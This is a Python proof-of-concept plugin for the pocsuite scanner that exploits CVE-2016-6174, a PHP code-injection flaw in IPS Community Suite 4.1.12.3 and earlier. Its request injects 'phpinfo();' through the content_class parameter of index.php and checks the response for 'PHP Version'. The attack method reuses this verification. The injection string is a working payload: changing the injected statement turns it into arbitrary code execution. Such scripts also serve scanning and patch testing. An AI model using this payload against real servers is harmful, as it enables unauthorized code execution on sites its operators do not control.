#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '1'  # vul ID
    version = '4.1.12.3'
    author = 'jinyu00'
    vulDate = '2016-07-10'
    createDate = '2016-07-10'
    updateDate = '2016-07-10'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6174']
    name = 'IPS Community Suite <= 4.1.12.3 Autoloaded PHP远程带执行漏洞'
    appPowerLink = 'https://invisionpower.com/release-notes/4113-r44/'
    appName = 'IPS Community Suite'
    appVersion = 'IPS Community Suite <= 4.1.12.3'
    vulType = 'Code Execution'
    desc = '''
    IPS Community Suite <= 4.1.12.3 Autoloaded PHP远程带执行漏洞
    '''

    def _attack(self):
        return self._verify()

    def _verify(self):
        payload = '/index.php?app=core&module=system&controller=content&do=find&content_class=cmsFields1{}phpinfo();/*'
        res = req.get(self.url + payload)
        return self.parse_verify(res)

    def parse_verify(self, res):
        output = Output(self)
        result = {}
        if res.status_code == 200 and "PHP Version" in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            output.success(result)
        else:
            output.fail('No vulnerability found.')

        return output


register(TestPOC)
